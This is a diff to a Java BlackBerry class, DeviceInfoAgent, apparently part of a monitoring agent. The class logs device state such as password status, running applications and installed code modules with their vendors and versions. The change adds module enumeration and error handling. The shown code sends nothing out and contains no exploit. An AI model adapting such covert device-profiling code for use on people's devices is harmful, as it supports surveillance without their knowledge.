@@ -12,6 +12,7 @@ package blackberry.agent;
 import java.io.EOFException;
 import java.util.Date;
 import java.util.Enumeration;
+import java.util.Hashtable;
 
 import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.ApplicationManager;
@@ -131,10 +132,16 @@ public final class DeviceInfoAgent extends Agent {
         sb.append("Holster: " + DeviceInfo.isInHolster() + "\n");
         sb.append("PasswordEnabled: " + DeviceInfo.isPasswordEnabled() + "\n");
 
-        if (this.installedApplication) {
-            sb.append(getRunningApplications());
-            sb.append(getInstalledModuleGroup());
-            sb.append(getInstalledApplications());
+        try {
+            if (this.installedApplication) {
+                sb.append(getRunningApplications());
+                sb.append(getInstalledModuleGroup());
+                //sb.append(getInstalledApplications());
+            }
+        } catch (Exception ex) {
+            //#ifdef DEBUG_ERROR
+            debug.error(ex);
+            //#endif
         }
 
         ret = log.writeLog(sb.toString(), true);
@@ -191,7 +198,7 @@ public final class DeviceInfoAgent extends Agent {
         int size = handles.length;
         for (int i = 0; i < size; i++) {
             int handle = handles[i];
-
+            //CodeModuleManager.getModuleHandle(name)
             // Retrieve specific information about a module.
             String name = CodeModuleManager.getModuleName(handle);
             String vendor = CodeModuleManager.getModuleVendor(handle);
@@ -204,10 +211,6 @@ public final class DeviceInfoAgent extends Agent {
             sb.append(name);
             sb.append(" , ");
             sb.append(vendor);
-            sb.append(" , ");
-            sb.append(version);
-            sb.append(" , ");
-            sb.append(date.toString());
             sb.append("\r\n");
         }
 
@@ -220,8 +223,15 @@ public final class DeviceInfoAgent extends Agent {
 
         // Retrieve an array of handles for existing modules on a BlackBerry device
         CodeModuleGroup handles[] = CodeModuleGroupManager.loadAll();
+        // Retrieve an array of handles for existing modules on a BlackBerry device
+        int AllModulesHandles[] = CodeModuleManager.getModuleHandles();
+        Hashtable remainigModules = new Hashtable();
+        int size = AllModulesHandles.length;
+        for (int i = 0; i < size; i++) {
+            remainigModules.put(new Integer(AllModulesHandles[i]), new Object());
+        }
 
-        int size = handles.length;
+        size = handles.length;
         for (int i = 0; i < size; i++) {
             CodeModuleGroup group = handles[i];
 
@@ -245,15 +255,44 @@ public final class DeviceInfoAgent extends Agent {
 
             Enumeration enumerator = group.getModules();
             while (enumerator.hasMoreElements()) {
-                Object module = enumerator.nextElement();
-                sb.append("--> " + module);
+                String moduleName = (String) enumerator.nextElement();
+                int handle = CodeModuleManager.getModuleHandle(moduleName);
+                // Retrieve specific information about a module.
+
+                sb.append("--> " + moduleName);
+                if (handle > 0) {
+                    remainigModules.remove(new Integer(handle));
+                    String vendorModule = CodeModuleManager
+                            .getModuleVendor(handle);
+                    String versionModule = CodeModuleManager
+                            .getModuleVersion(handle);
+                    sb.append(", " + vendorModule);
+                    sb.append(", " + versionModule);
+                }
                 sb.append("\r\n");
             }
 
             sb.append("\r\n");
-
+           
         }
 
+        sb.append("\r\nUngrouped:\r\n\r\n");
+        Enumeration enumeration = remainigModules.keys();
+        while (enumeration.hasMoreElements()) {
+            Integer handle = (Integer) enumeration.nextElement();
+
+            String nameModule = CodeModuleManager
+                    .getModuleName(handle.intValue());
+            String vendorModule = CodeModuleManager.getModuleVendor(handle
+                    .intValue());
+            String versionModule = CodeModuleManager
+                    .getModuleVersion(handle.intValue());
+            
+            sb.append( nameModule);
+            sb.append(", " + vendorModule);
+            sb.append(", " + versionModule);
+            sb.append("\r\n");
+        }
         return sb.toString();
     }
 
